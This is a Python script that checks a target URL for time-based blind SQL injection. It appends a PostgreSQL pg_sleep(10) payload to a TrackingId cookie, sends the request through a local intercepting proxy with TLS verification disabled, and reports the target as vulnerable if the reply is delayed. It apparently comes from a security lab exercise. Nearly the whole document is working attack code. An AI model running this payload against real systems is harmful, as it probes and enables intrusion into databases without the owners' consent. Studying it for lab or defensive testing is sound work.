import sys
import requests
import urllib
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


# if response time is greater than 10 seconds, we have successfully exploited the SQLi vulnerability
def blind_sqli_check(url):
    sqli_payload = "' || (SELECT pg_sleep(10))--"
    sqli_payload_encoded = urllib.parse.quote(sqli_payload)
    cookies = {
        "TrackingId": "WiKhV8Ps5p11qP2q" + sqli_payload_encoded, # replace TrackingId cookie value with correct value
        "session": "r3fRaDQSzr3G7FNkqtCUBiuNuLrc5YdS" # replace session cookie value with correct value
    }

    res = requests.get(url, cookies=cookies, verify=False, proxies=proxies)

    if int(res.elapsed.total_seconds()) >= 10:
        print("[+] Vulnerable to blind-based SQL injection!")
    else:
        print("[-] Not vulnerable to blind-based SQL injection.")



def main():
    if len(sys.argv) != 2: # error trap args count
        print('[+] Usage: %s "<url>"' % sys.argv[0])
        print('[+] Example: %s "www.example.com"' % sys.argv[0])
        exit(-1)
    url = sys.argv[1]
    print("[+] Checking if tracking cookie is vulnerable to time-based blind SQLi...")
    blind_sqli_check(url)


if __name__ == "__main__":
    main()